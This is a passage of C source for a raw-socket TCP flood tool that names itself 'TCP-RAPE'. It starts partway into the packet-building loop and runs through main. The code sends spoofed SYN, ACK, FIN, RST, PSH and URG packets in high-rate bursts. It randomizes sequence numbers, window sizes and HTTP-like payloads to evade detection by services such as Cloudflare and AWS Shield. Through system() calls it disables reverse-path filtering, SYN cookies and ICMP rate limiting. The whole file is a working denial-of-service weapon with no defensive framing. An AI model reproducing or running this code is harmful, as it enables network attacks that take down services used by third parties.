        int tcp_doff = 5 + (tcp_opt_len + 3) / 4;  // Round up to 4-byte boundary
        if (tcp_doff > 15) tcp_doff = 15;  // Max is 15
        if (tcp_doff < 5) tcp_doff = 5;    // Min is 5 (20 bytes base header)
        tcph->doff = tcp_doff;  // Variable header size (5-15) to bypass detection

        // Elite bypass: Realistic sequence numbers ensuring server acceptance
        uint32_t seq_val, ack_val;
        if (g_elite_mode && conn) {
            if (attack_type == ATTACK_SYN) {
                // SYN: Use ISN (Initial Sequence Number) - must be random and valid
                seq_val = conn->seq_base;
                ack_val = 0;  // No ACK in SYN
            } else if (attack_type == ATTACK_SYNACK) {
                // SYN-ACK: Our seq = ISN+1, ack = their ISN+1
                seq_val = conn->seq_base + 1;
                ack_val = conn->ack_base + 1;  // ACK their SYN
            } else {
                // Established connection: Ensure valid sequence progression
                // Always increment properly to ensure server accepts packets
                uint32_t data_sent = 0;
                if (attack_type == ATTACK_PSH || (tcph->psh && tcph->ack)) {
                    // PSH packets have payload - increment by payload size
                    data_sent = random_number_beetwhen(100, conn->mss);
                } else if (attack_type == ATTACK_ACK) {
                    // Pure ACK: no data sent, but sequence must be valid
                    data_sent = 0;
                } else {
                    // Other packets: minimal or no data
                    data_sent = random_number_beetwhen(0, 100);
                }
                conn->seq_current += data_sent;
                seq_val = conn->seq_current;
                
                // ACK number: Must acknowledge received data properly
                if (tcph->ack) {
                    // Simulate receiving data from server - increment ack properly
                    uint32_t data_acked = random_number_beetwhen(0, conn->mss);
                    conn->ack_current += data_acked;
                    ack_val = conn->ack_current;
                } else {
                    ack_val = 0;
                }
            }
        } else {
            // Standard mode: Ensure valid sequences for server acceptance
            if (attack_type == ATTACK_SYN || attack_type == ATTACK_SYNACK) {
                // Use proper ISN generation
                seq_val = base_seq + (burst * 1000000);
                if (attack_type == ATTACK_SYNACK) {
                    // SYN-ACK must ACK the SYN
                    ack_val = base_ack + 1;  // ACK their ISN+1
                } else {
                    ack_val = 0;  // No ACK in SYN
                }
            } else {
                // Established: Proper sequence progression
                seq_val = base_seq + (burst * 1460);  // Increment by MSS
                if (tcph->ack) {
                    // ACK must be valid
                    ack_val = base_ack + (burst * 2920);
                } else {
                    ack_val = 0;
                }
            }
        }
        
        tcph->seq = htonl(seq_val);
        if (tcph->ack) {
            tcph->ack_seq = htonl(ack_val);
        } else {
            tcph->ack_seq = 0;
        }

        // Elite bypass: Realistic window size ensuring server acceptance
        uint16_t window_size;
        if (g_elite_mode && conn) {
            // Use connection's window size with realistic variations
            window_size = conn->window_size;
            if (conn->packet_count % 10 == 0) {
                // Occasionally update window (simulate flow control)
                // Use common window sizes that servers expect
                int common_windows[] = {16384, 32768, 65535, 4380, 8760, 13130};
                int idx = random_number_beetwhen(0, 5);
                window_size = common_windows[idx];
                conn->window_size = window_size;
            } else {
                // Small realistic variations (not too large to avoid suspicion)
                int variation = random_number_beetwhen(-500, 500);
                window_size = (window_size + variation < 1024) ? 1024 :
                             (window_size + variation > 65535) ? 65535 :
                             window_size + variation;
            }
        } else {
            // Use common window sizes for better acceptance
            int common_windows[] = {16384, 32768, 65535, 4380, 8760};
            int idx = random_number_beetwhen(0, 4);
            window_size = common_windows[idx];
        }
        tcph->window = htons(window_size);
        tcph->urg_ptr = 0;

        // Copy options to datagram
        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr), tcp_options, tcp_opt_len);
        int opt_padding = (tcp_doff * 4) - sizeof(struct tcphdr) - tcp_opt_len;
        if (opt_padding > 0) {
            memset(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + tcp_opt_len,
                   TCP_OPT_NOP, opt_padding);
        }

        // Clever bypass: Variable payload size to avoid fixed-size detection
        int payload_size = 0;
        if (attack_type == ATTACK_SYN || attack_type == ATTACK_SYNACK) {
            payload_size = 0;  // SYN packets never have payload
        } else {
            // Variable payload: Most ACK packets have no payload (70% chance)
            if (attack_type == ATTACK_ACK) {
                if (random_number_beetwhen(0, 9) < 3) {
                    // 30% chance: Variable payload (0-1420 bytes)
                    payload_size = random_number_beetwhen(0, sizeof(payload_data));
                } else {
                    payload_size = 0;  // 70% chance: No payload (pure ACK)
                }
            } else {
                // Other packet types: Variable payload sizes
                payload_size = random_number_beetwhen(0, sizeof(payload_data));
            }
            
            // Stealth mode: HTTP-like payloads to bypass WAF/DPI
            if (g_stealth_mode && payload_size > 0 && (attack_type == ATTACK_PSH || attack_type == ATTACK_ACK)) {
                // Generate HTTP-like payload
                const char* http_templates[] = {
                    "GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
                    "POST /api/data HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n",
                    "GET /index.html HTTP/1.1\r\nHost: example.com\r\nConnection: keep-alive\r\n\r\n"
                };
                int template_idx = random_number_beetwhen(0, 2);
                const char* http_payload = http_templates[template_idx];
                int http_len = (int)strlen(http_payload);
                if (payload_size > http_len) {
                    memcpy(payload_data, http_payload, http_len);
                    // Fill rest with random
                    for (int i = http_len; i < payload_size; i++) {
                        payload_data[i] = (char)(random_number_beetwhen(32, 126));
                    }
                } else {
                    memcpy(payload_data, http_payload, payload_size);
                }
            } else if (payload_size > 0) {
                // Regenerate random payload each time to avoid 0xFF pattern detection
                for (int i = 0; i < payload_size; i++) {
                    payload_data[i] = (char)(random_number_beetwhen(0, 255));  // Full range
                }
            }
            
            if (payload_size > 0) {
                memcpy(datagram + sizeof(struct iphdr) + (tcp_doff * 4), payload_data, payload_size);
            }
        }

        int TCP_HDR_LEN = tcp_doff * 4;
        int TOTAL_PACKET_LEN = sizeof(struct iphdr) + TCP_HDR_LEN + payload_size;
        iph->tot_len = TOTAL_PACKET_LEN;
        psh.dest_address = sin.sin_addr.s_addr;

        // Calculate checksums
        iph->check = 0;
        iph->check = checksum_tcp_packet((unsigned short *) datagram, sizeof(struct iphdr));
        if (iph->check == 0) {
            iph->check = 0xFFFF;
        }

        psh.tcp_length = htons(TCP_HDR_LEN + payload_size);
        tcph->check = 0;

        // Build pseudo header for TCP checksum
        unsigned char pseudogram_buffer[2048];
        uint32_t *pseudogram_u32 = (uint32_t *)pseudogram_buffer;
        pseudogram_u32[0] = psh.source_address;
        pseudogram_u32[1] = psh.dest_address;
        pseudogram_buffer[8] = 0;
        pseudogram_buffer[9] = IPPROTO_TCP;
        *((uint16_t *)(pseudogram_buffer + 10)) = psh.tcp_length;

        memcpy(pseudogram_buffer + 12, datagram + sizeof(struct iphdr), TCP_HDR_LEN + payload_size);

        int PSEUDO_SIZE = 12 + TCP_HDR_LEN + payload_size;
        tcph->check = checksum_tcp_packet((unsigned short*) pseudogram_buffer, PSEUDO_SIZE);
        if (tcph->check == 0) {
            tcph->check = 0xFFFF;
        }

        // Maximum power sending: Send many packets per iteration
        int packets_per_burst = 1;
        if (aggressive_mode && !g_stealth_mode) {
            // Maximum power: Send 10-20 packets per iteration for ultimate throughput
            packets_per_burst = random_number_beetwhen(10, 20);
        } else if (g_stealth_mode) {
            // Stealth: Still send multiple packets but more controlled (2-5)
            packets_per_burst = random_number_beetwhen(2, 5);
        } else {
            // Default: High throughput (5-10 packets)
            packets_per_burst = random_number_beetwhen(5, 10);
        }
        
        for (int pkt = 0; pkt < packets_per_burst; pkt++) {
            // Vary packet slightly for each send
            if (pkt > 0) {
                // Change sequence numbers slightly
                uint32_t seq_adjust = pkt * 1460;
                tcph->seq = htonl(ntohl(tcph->seq) + seq_adjust);
                if (tcph->ack) {
                    tcph->ack_seq = htonl(ntohl(tcph->ack_seq) + seq_adjust);
                }
                // Recalculate checksum
                iph->check = 0;
                iph->check = checksum_tcp_packet((unsigned short *) datagram, sizeof(struct iphdr));
                if (iph->check == 0) iph->check = 0xFFFF;
                
                // Rebuild pseudo header for TCP checksum
                memcpy(pseudogram_buffer + 12, datagram + sizeof(struct iphdr), TCP_HDR_LEN + payload_size);
                tcph->check = 0;
                tcph->check = checksum_tcp_packet((unsigned short*) pseudogram_buffer, PSEUDO_SIZE);
                if (tcph->check == 0) tcph->check = 0xFFFF;
            }
            
            // Send packet with maximum flags for throughput
            int send_result = sendto(s, datagram, iph->tot_len, 
                                     MSG_DONTWAIT | MSG_NOSIGNAL | MSG_MORE,
                                     (struct sockaddr *) &sin, sizeof(sin));

            if (send_result > 0) {
                __sync_add_and_fetch(&g_total_packets_sent, 1);
                
                // Track packet types
                switch(attack_type) {
                    case ATTACK_SYN: __sync_add_and_fetch(&g_syn_sent, 1); break;
                    case ATTACK_ACK: __sync_add_and_fetch(&g_ack_sent, 1); break;
                    case ATTACK_FIN: __sync_add_and_fetch(&g_fin_sent, 1); break;
                    case ATTACK_RST: __sync_add_and_fetch(&g_rst_sent, 1); break;
                    case ATTACK_PSH: __sync_add_and_fetch(&g_psh_sent, 1); break;
                    case ATTACK_URG: __sync_add_and_fetch(&g_urg_sent, 1); break;
                    case ATTACK_MIXED: __sync_add_and_fetch(&g_mixed_sent, 1); break;
                }

                // Fast socket rotation for load distribution
                socket_idx = (socket_idx + 1) % sockets_created;
                s = sockets[socket_idx];
            } else {
                // On error, quickly rotate to next socket and continue
                if (errno == EAGAIN || errno == EWOULDBLOCK || errno == ENOBUFS) {
                    socket_idx = (socket_idx + 1) % sockets_created;
                    s = sockets[socket_idx];
                    // Don't break - continue with next socket immediately
                }
            }
        }
    }

    for (int i = 0; i < sockets_created; i++) {
        if (sockets[i] >= 0) {
            close(sockets[i]);
        }
    }
    free(sockets);
    if (conn_states) free(conn_states);
    if (hash_table) free(hash_table);

    return NULL;
}

void *stats_thread(void *arg) {
    (void)arg;
    uint64_t last_sent = 0;
    time_t last_time = time(NULL);

    sleep(2);

    while (g_running) {
        for (int i = 0; i < 10 && g_running; i++) {
            usleep(100000);
            if (!g_running) break;
        }
        if (!g_running) break;

        uint64_t current_sent = g_total_packets_sent;
        time_t current_time = time(NULL);
        time_t time_diff = current_time - last_time;
        if (time_diff == 0) time_diff = 1;

        uint64_t pps_calc = (current_sent - last_sent) / time_diff;
        // Calculate Mbps with average packet size (including payloads)
        double avg_packet_size = 80.0;  // Base size
        if (g_total_packets_sent > 0) {
            // Estimate: SYN packets ~60 bytes, others with payload ~800-1500 bytes
            avg_packet_size = 60.0 + (800.0 * (g_ack_sent + g_psh_sent + g_fin_sent + g_rst_sent) / (double)g_total_packets_sent);
        }
        double mbps = (pps_calc * avg_packet_size * 8.0) / 1000000.0;

        printf("\r\033[K[LIVE] PPS: %10lu | Total: %12lu | SYN: %8lu | ACK: %8lu | FIN: %8lu | RST: %8lu | PSH: %8lu | URG: %8lu | MIXED: %8lu | Mbps: %8.2f",
               pps_calc, current_sent, g_syn_sent, g_ack_sent, g_fin_sent, g_rst_sent, g_psh_sent, g_urg_sent, g_mixed_sent, mbps);
        fflush(stdout);

        last_sent = current_sent;
        last_time = current_time;
    }

    return NULL;
}

void signal_handler(int sig) {
    (void)sig;
    g_signal_count++;
    printf("\n[!] CTRL+C pressed (%d) - Stopping attack...\n", g_signal_count);
    fflush(stdout);
    g_running = 0;

    if (g_signal_count >= 2) {
        _exit(0);
    }
}

int main(int argc, char *argv[]) {
    if(argc < 6) {
        printf("Usage: %s <target_ip> <target_port> <threads> <duration> <max_pps> [attack_mode] [--elite] [--stealth]\n", argv[0]);
        printf("Attack modes: syn, ack, fin, rst, psh, urg, synack, finack, mixed, all (default: all)\n");
        printf("  --elite    Enable elite bypass mode (full connection simulation, behavioral patterns)\n");
        printf("  --stealth  Enable stealth mode (HTTP payloads, OS fingerprinting, human timing, max bypass)\n");
        exit(-1);
    }

    // Disable rp_filter for spoofing
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-result"
    (void)system("echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter 2>/dev/null");
    (void)system("echo 0 > /proc/sys/net/ipv4/conf/default/rp_filter 2>/dev/null");
#pragma GCC diagnostic pop

    // Maximum resource limits for ultimate power
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rlim_t target_limit = 1048576;  // 1M file descriptors
        if (target_limit > rl.rlim_max) {
            target_limit = rl.rlim_max;
        }
        rl.rlim_cur = target_limit;
        setrlimit(RLIMIT_NOFILE, &rl);
    }
    
    // Increase process priority for maximum throughput
    setpriority(PRIO_PROCESS, 0, -20);  // Highest priority
    
    // Additional system optimizations for maximum power
    // Disable ICMP rate limiting
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-result"
    (void)system("echo 0 > /proc/sys/net/ipv4/icmp_ratelimit 2>/dev/null");
    // Increase connection tracking limits
    (void)system("echo 1000000 > /proc/sys/net/netfilter/nf_conntrack_max 2>/dev/null");
    // Disable SYN cookies (if enabled, can slow down)
    (void)system("echo 0 > /proc/sys/net/ipv4/tcp_syncookies 2>/dev/null");
    // Increase TCP buffer sizes globally
    (void)system("echo 'net.core.rmem_max = 134217728' >> /etc/sysctl.conf 2>/dev/null");
    (void)system("echo 'net.core.wmem_max = 134217728' >> /etc/sysctl.conf 2>/dev/null");
    (void)system("sysctl -w net.core.rmem_max=134217728 2>/dev/null");
    (void)system("sysctl -w net.core.wmem_max=134217728 2>/dev/null");
#pragma GCC diagnostic pop

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGPIPE, SIG_IGN);

    floodport = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    int run_time = atoi(argv[4]);
    g_max_pps = atoi(argv[5]);

    if (argc >= 7) {
        for (int i = 6; i < argc; i++) {
            if (strcmp(argv[i], "--elite") == 0) {
                g_elite_mode = 1;
            } else if (strcmp(argv[i], "--stealth") == 0) {
                g_stealth_mode = 1;
                g_elite_mode = 1;  // Stealth requires elite mode
            } else if (strcmp(argv[i], "syn") == 0) g_attack_mode = ATTACK_SYN;
            else if (strcmp(argv[i], "ack") == 0) g_attack_mode = ATTACK_ACK;
            else if (strcmp(argv[i], "fin") == 0) g_attack_mode = ATTACK_FIN;
            else if (strcmp(argv[i], "rst") == 0) g_attack_mode = ATTACK_RST;
            else if (strcmp(argv[i], "psh") == 0) g_attack_mode = ATTACK_PSH;
            else if (strcmp(argv[i], "urg") == 0) g_attack_mode = ATTACK_URG;
            else if (strcmp(argv[i], "synack") == 0) g_attack_mode = ATTACK_SYNACK;
            else if (strcmp(argv[i], "finack") == 0) g_attack_mode = ATTACK_FINACK;
            else if (strcmp(argv[i], "mixed") == 0) g_attack_mode = ATTACK_MIXED;
            else if (strcmp(argv[i], "all") == 0) g_attack_mode = ATTACK_ALL;
        }
    }

    if (num_threads <= 0 || num_threads > 10000) {
        exit(-1);
    }

    pthread_t *thread = calloc(num_threads, sizeof(pthread_t));
    if (!thread) {
        exit(-1);
    }
    pthread_t stats_t;

    g_running = 1;
    g_threads_ready = 0;

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    size_t stacksize = 1024 * 1024;
    pthread_attr_setstacksize(&attr, stacksize);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);

    const char *mode_names[] = {"SYN", "ACK", "FIN", "RST", "PSH", "URG", "SYN-ACK", "FIN-ACK", "MIXED", "ALL"};
    printf("[+] TCP-RAPE: Multi-Vector TCP Attack Tool\n");
    printf("[+] Target: %s:%d\n", argv[1], floodport);
    printf("[+] Threads: %d\n", num_threads);
    printf("[+] Duration: %d seconds\n", run_time);
    printf("[+] Max PPS: %lu\n", g_max_pps);
    printf("[+] Attack Mode: %s\n", mode_names[g_attack_mode]);
    if (g_stealth_mode) {
        printf("[+] STEALTH MODE: ENABLED (Advanced bypass: HTTP payloads, OS fingerprinting, human timing)\n");
        printf("[*] Bypassing: Cloudflare, AWS Shield, WAF, DPI, behavioral analysis, ML detection, anomaly detection\n");
    } else if (g_elite_mode) {
        printf("[+] ELITE MODE: ENABLED (Full connection simulation, behavioral patterns, maximum bypass)\n");
        printf("[*] Bypassing: Cloudflare, AWS Shield, behavioral analysis, ML detection, stateful firewalls\n");
    }
    printf("[*] MAXIMUM POWER MODE: 10,000 sockets per thread, 512MB buffers, zero delays, 10-20 packets/burst\n");
    printf("[*] Reverse path filtering disabled for IP spoofing\n");
    printf("[*] Starting attack...\n");
    fflush(stdout);

    int threads_created = 0;
    for(int i = 0; i < num_threads; i++) {
        int result = pthread_create(&thread[i], &attr, &flooding_thread, (void *)argv[1]);
        if (result != 0) {
            if (result == EAGAIN) {
                usleep(10000);
                break;
            }
        } else {
            threads_created++;
        }
    }

    pthread_attr_destroy(&attr);

    pthread_attr_t stats_attr;
    pthread_attr_init(&stats_attr);
    pthread_attr_setdetachstate(&stats_attr, PTHREAD_CREATE_DETACHED);
    pthread_create(&stats_t, &stats_attr, stats_thread, NULL);
    pthread_attr_destroy(&stats_attr);

    time_t start_time = time(NULL);
    time_t end_time = start_time + run_time;

    while (g_running) {
        time_t current_time = time(NULL);
        if (current_time >= end_time) {
            break;
        }
        usleep(100000);
    }

    g_running = 0;
    printf("\n[*] Stopping attack...\n");
    fflush(stdout);

    for (int i = 0; i < threads_created; i++) {
        pthread_cancel(thread[i]);
        pthread_join(thread[i], NULL);
    }

    printf("\n=== Final Statistics ===\n");
    printf("Total Packets Sent: %lu\n", g_total_packets_sent);
    printf("SYN Packets: %lu\n", g_syn_sent);
    printf("ACK Packets: %lu\n", g_ack_sent);
    printf("FIN Packets: %lu\n", g_fin_sent);
    printf("RST Packets: %lu\n", g_rst_sent);
    printf("PSH Packets: %lu\n", g_psh_sent);
    printf("URG Packets: %lu\n", g_urg_sent);
    printf("Mixed Packets: %lu\n", g_mixed_sent);
    fflush(stdout);

    free(thread);
    exit(0);
}

